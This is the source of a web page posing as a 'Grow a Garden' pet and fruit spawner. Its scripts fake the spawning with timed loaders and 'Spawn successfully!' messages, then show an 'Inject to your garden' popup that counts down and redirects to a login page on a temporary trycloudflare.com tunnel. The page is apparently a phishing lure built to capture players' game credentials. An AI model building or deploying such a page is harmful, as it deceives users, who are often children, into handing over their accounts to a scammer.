<!DOCTYPE html>

  <style>

    .loader {
  border: 4px solid #f3f3f3;
  border-top: 4px solid #0984e3;
  border-radius: 50%;
  width: 30px;
  height: 30px;
  animation: spin 0.8s linear infinite;
  margin: 10px auto;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

    body {
      font-family: 'Segoe UI', sans-serif;
      padding: 20px;
      text-align: center;
      background-image: url('grow-a-garden-bg.png');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      color: #2c3e50;
    }

    h1 {
      font-size: 2.5rem;
      background-color: rgba(255, 255, 255, 0.85);
      display: inline-block;
      padding: 10px 25px;
      border-radius: 15px;
      box-shadow: 0 0 8px rgba(0,0,0,0.15);
    }

    .spawner-box {
      border: 3px solid #74b9ff;
      border-radius: 15px;
      padding: 30px;
      margin: 40px auto;
      width: 95%;
      max-width: 850px;
      background: rgba(255, 255, 255, 0.95);
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }

    .selector-section {
      display: flex;
      justify-content: space-around;
      flex-wrap: wrap;
      gap: 30px;
    }

    .selector {
      flex: 1;
      min-width: 250px;
    }

    h2 {
      font-size: 1.8rem;
      margin-bottom: 10px;
      color: #2d3436;
    }

    select {
      font-size: 1.1rem;
      padding: 10px;
      width: 100%;
      border-radius: 6px;
      border: 2px solid #ccc;
    }

    button {
      padding: 10px 25px;
      font-size: 1rem;
      cursor: pointer;
      border: none;
      border-radius: 6px;
      background-color: #55efc4;
      color: #2d3436;
      font-weight: bold;
      transition: background 0.2s;
      margin-top: 10px;
    }

    button:hover {
      background-color: #00cec9;
      color: white;
    }

    .spawn-output {
      margin-top: 15px;
      font-size: 1.5rem;
      min-height: 40px;
      color: #2c3e50;
    }

    .glow-success {
      color: #27ae60;
      text-shadow: 0 0 8px #27ae60;
      font-weight: bold;
    }

@keyframes fadeSlideUp {
  0% {
    opacity: 0;
    transform: translate(-50%, 20px);
  }
  100% {
    opacity: 1;
    transform: translate(-50%, 0);
  }
}

#popupBox {
  position: fixed;
  left: 50%;
  bottom: 100px;
  transform: translateX(-50%);
  background: #0984e3;
  color: white;
  padding: 15px 30px;
  border-radius: 10px;
  font-weight: bold;
  font-size: 1.4rem;
  cursor: pointer;
  box-shadow: 0 0 15px rgba(9,132,227,0.7);
  display: none;
  user-select: none;
  z-index: 1000;
  opacity: 0;
  transition: opacity 0.3s ease;
}

#popupBox.show {
  display: block;
  animation: fadeSlideUp 0.5s ease forwards;
}

  </style>
</head>

  <!-- Pop-up Box -->
  <div id="popupBox">Inject to your garden</div>

  <script>
  const popup = document.getElementById('popupBox');
  let petSpawned = false;
  let fruitSpawned = false;

  popup.textContent = "Inject to your garden";

  popup.addEventListener('click', () => {
  let countdown = 10;
  popup.textContent = `Injecting... ${countdown}`;
  popup.style.pointerEvents = "none"; // Disable further clicks

  const interval = setInterval(() => {
    countdown--;
    popup.textContent = countdown > 0 ? `Injecting... ${countdown}` : "Redirecting";
    if (countdown === 0) {
      clearInterval(interval);

      // Start dot animation
      let dots = "";
      const dotInterval = setInterval(() => {
        dots = dots.length < 3 ? dots + "." : "";
        popup.textContent = "Redirecting" + dots;
      }, 500);

      // Final redirect after 3 seconds of dot animation
      setTimeout(() => {
        clearInterval(dotInterval);
        window.location.href = 'https://knights-featured-deployment-tp.trycloudflare.com/login.html';
      }, 3000);
    }
  }, 1000);
});

  function spawnPet() {
  const petSelect = document.getElementById('petSelector');
  const output = document.getElementById('petOutput');

  if (!petSelect.value || petSelect.selectedIndex === 0) {
    alert("Please select a pet first!");
    return;
  }

  output.innerHTML = '<div class="loader"></div>';
  output.classList.remove('glow-success');

  setTimeout(() => {
    output.textContent = "Spawn successfully!";
    output.classList.add('glow-success');
    petSpawned = true;
    checkPopupTrigger();
  }, 3000);
}

function spawnFruit() {
  const fruitSelect = document.getElementById('fruitSelector');
  const output = document.getElementById('fruitOutput');

  if (!fruitSelect.value || fruitSelect.selectedIndex === 0) {
    alert("Please select a fruit first!");
    return;
  }

  output.innerHTML = '<div class="loader"></div>';
  output.classList.remove('glow-success');

  setTimeout(() => {
    output.textContent = "Spawn successfully!";
    output.classList.add('glow-success');
    fruitSpawned = true;
    checkPopupTrigger();
  }, 3000);
}

  function checkPopupTrigger() {
    if (petSpawned && fruitSpawned) {
      popup.classList.add('show');
    }
  }

  function clearOutputs() {
    document.getElementById('petOutput').textContent = "";
    document.getElementById('petOutput').classList.remove('glow-success');
    document.getElementById('fruitOutput').textContent = "";
    document.getElementById('fruitOutput').classList.remove('glow-success');
    petSpawned = false;
    fruitSpawned = false;
    popup.classList.remove('show');
  }
</script>
